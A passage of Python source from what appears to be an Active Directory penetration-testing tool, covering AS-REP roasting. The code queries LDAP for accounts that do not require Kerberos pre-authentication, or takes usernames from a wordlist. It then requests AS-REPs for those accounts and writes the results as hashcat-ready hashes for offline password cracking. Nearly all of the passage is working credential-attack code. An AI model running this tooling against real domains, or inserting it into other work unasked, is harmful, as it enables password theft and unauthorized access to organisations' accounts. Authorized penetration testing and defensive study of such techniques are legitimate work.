        credential: Optional[str],
        dc_ip: str,
        domains_data: object,
        sync_clock: Optional[Callable[[str], bool]],
    ) -> bool:
        """Prepare Kerberos workspace state for one native roasting operation."""
        return prepare_kerberos_ldap_environment(
            operation_name=operation_name,
            target_domain=target_domain,
            workspace_dir=workspace_dir,
            username=username,
            user_domain=user_domain,
            credential=credential,
            dc_ip=dc_ip,
            domains_data=domains_data,
            sync_clock=sync_clock,
        )

    def _write_hash_lines(
        self, output_file: Optional[Path], lines_to_write: list[str]
    ) -> None:
        """Write one hash per line when an output file is requested."""
        if output_file is None:
            return
        output_file.parent.mkdir(parents=True, exist_ok=True)
        output_file.write_text(
            "".join(f"{line}\n" for line in lines_to_write),
            encoding="utf-8",
        )

    def _read_target_lines(self, usersfile: Optional[Path]) -> list[str]:
        """Read a plain text target file into normalized non-empty entries."""
        if usersfile is None or not usersfile.exists():
            return []
        try:
            content = usersfile.read_text(encoding="utf-8", errors="ignore")
        except OSError as exc:
            telemetry.capture_exception(exc)
            self.logger.exception("Failed to read roasting targets from users file")
            return []
        return [line.strip() for line in content.splitlines() if line.strip()]

    def _asreproast_authenticated_via_ldap(
        self,
        *,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str],
        hashes: Optional[str],
        auth_domain: str,
        output_file: Optional[Path],
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
    ) -> List[ASREPHash]:
        """Enumerate UF_DONT_REQUIRE_PREAUTH users over LDAP and request AS-REPs via kerbad."""
        domains_data_obj: object = domains_data or {}
        workspace_root = str(workspace_dir or "").strip()
        sync_clock_fn = sync_clock

        kerberos_ready = self._prepare_roasting_kerberos_environment(
            operation_name="authenticated asreproast",
            target_domain=domain,
            workspace_dir=workspace_root,
            username=username,
            user_domain=auth_domain,
            credential=password or hashes,
            dc_ip=pdc,
            domains_data=domains_data_obj,
            sync_clock=sync_clock_fn,
        )
        if not kerberos_ready:
            return []

        domains_data = domains_data_obj if isinstance(domains_data_obj, dict) else {}
        domain_data = (
            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
        )
        endpoints = resolve_ldap_target_endpoints(
            target_domain=domain,
            domain_data={**domain_data, "pdc": pdc or domain_data.get("pdc")},
            kerberos_ready=True,
        )
        dc_address = str(pdc or endpoints.dc_address or "").strip()
        if not dc_address:
            return []

        search_filter = (
            f"(&(UserAccountControl:1.2.840.113556.1.4.803:={_UF_DONT_REQUIRE_PREAUTH})"
            f"(!(UserAccountControl:1.2.840.113556.1.4.803:={_UF_ACCOUNTDISABLE}))"
            "(!(objectCategory=computer)))"
        )

        def _collect(connection: Any) -> list[str]:
            search_base = ",".join(
                f"DC={label}" for label in str(domain).split(".") if label.strip()
            )
            connection.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=["sAMAccountName"],
                search_scope="SUBTREE",
                paged_size=1000,
            )
            if not isinstance(connection.entries, list):
                return []
            usernames: list[str] = []
            for entry in connection.entries:
                raw_mapping = entry.entry_attributes_as_dict
                mapping = raw_mapping if isinstance(raw_mapping, dict) else {}
                sam = str(
                    self._first_attribute_value(mapping, "sAMAccountName") or ""
                ).strip()
                if sam:
                    usernames.append(sam)
            return usernames

        candidates, _used_ldaps = execute_with_ldap_fallback(
            operation_name="authenticated asreproast",
            target_domain=domain,
            dc_address=dc_address,
            callback=_collect,
            username=username,
            password=password,
            use_kerberos=True,
            prefer_ldaps=True,
            kerberos_target_hostname=endpoints.kerberos_target_hostname,
            allow_password_fallback_on_kerberos_failure=False,
        )
        if not candidates:
            return []
        return self._collect_asrep_hashes_for_users(
            domain=domain,
            pdc=pdc,
            usernames=candidates,
            output_file=output_file,
        )

    def _asreproast_from_usersfile(
        self,
        *,
        domain: str,
        pdc: str,
        usersfile: Optional[Path],
        output_file: Optional[Path],
    ) -> List[ASREPHash]:
        """Attempt AS-REP roasting directly from a user wordlist."""
        return self._collect_asrep_hashes_for_users(
            domain=domain,
            pdc=pdc,
            usernames=self._read_target_lines(usersfile),
            output_file=output_file,
        )

    def _collect_asrep_hashes_for_users(
        self,
        *,
        domain: str,
        pdc: str,
        usernames: list[str],
        output_file: Optional[Path],
    ) -> List[ASREPHash]:
        """Request AS-REPs for a list of candidate usernames via kerbad.

        kerbad's ``asreproast`` generator sends an AS-REQ without pre-auth for
        each username and returns the hash formatted as hashcat 18200.

        Hashcat format (kerbad TGTTicket2hashcat):
            ``$krb5asrep$<etype>$<user>@<DOMAIN>:<checksum>$<ciphertext>``
        """
        filtered = [
            u
            for u in (str(u or "").strip() for u in usernames)
            if u and not u.endswith("$")
        ]
        if not filtered:
            return []

        try:
            roast_results = run_async_sync(asreproast_users(pdc, domain, filtered))
        except KerberosTransportError as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Kerberos transport error during AS-REP roasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Unexpected error during AS-REP roasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []

        lines_to_write: list[str] = []
        hashes_list: list[ASREPHash] = []
        table_rows: list[tuple[str, str, str, str]] = []
        preauth_count = 0
        revoked_count = 0
        other_skip_count = 0
        for username, hash_line, err in roast_results:
            user_display = mark_sensitive(username, "user")
            if err is not None and not hash_line:
                err_text = str(err)
                low = err_text.lower()
                if "preauth" in low or "kdc_err_preauth_required" in low:
                    preauth_count += 1
                    table_rows.append(
                        (
                            user_display,
                            "[yellow]preauth required[/yellow]",
                            "—",
                            "account enforces preauth",
                        )
                    )
                elif "revoked" in low or "kdc_err_client_revoked" in low:
                    revoked_count += 1
                    table_rows.append(
                        (
                            user_display,
                            "[dim]disabled[/dim]",
                            "—",
                            "account disabled or locked",
                        )
                    )
                else:
                    other_skip_count += 1
                    print_info_verbose(f"[skip] {user_display}: {err_text}")
                    table_rows.append(
                        (user_display, "[yellow]skipped[/yellow]", "—", err_text[:80])
                    )
                continue
            if not hash_line:
                other_skip_count += 1
                table_rows.append(
                    (
                        user_display,
                        "[yellow]no hash[/yellow]",
                        "—",
                        "no AS-REP returned",
                    )
                )
                continue
            hashes_list.append(ASREPHash(username=username, hash_value=hash_line))
            lines_to_write.append(hash_line)
            etype_label = _extract_etype(hash_line)
            styled = _styled_etype(etype_label)
            print_success(f"  └─ {user_display}  ({styled})  →  hashcat-ready")
            table_rows.append(
                (user_display, "[green]hash[/green]", etype_label, "AS-REP retrieved")
            )

        self._write_hash_lines(output_file, lines_to_write)

        skipped_total = preauth_count + revoked_count + other_skip_count
        if skipped_total and not is_verbose_mode():
            parts: list[str] = []
            if preauth_count:
                parts.append(f"{preauth_count} preauth-enforced")
            if revoked_count:
                parts.append(f"{revoked_count} disabled/revoked")
            if other_skip_count:
                parts.append(f"{other_skip_count} other")
            print_info(
                f"  [dim]{skipped_total} users skipped: "
                f"{' · '.join(parts)}  (run with --verbose for full table)[/dim]"
            )
        elif is_verbose_mode():
            _render_roast_summary(title="AS-REP Roast Results", rows=table_rows)

        _render_etype_advisory(
            [k for h in lines_to_write if (k := _extract_etype_key(h))],
            roast_type="asreproast",
        )
        return hashes_list
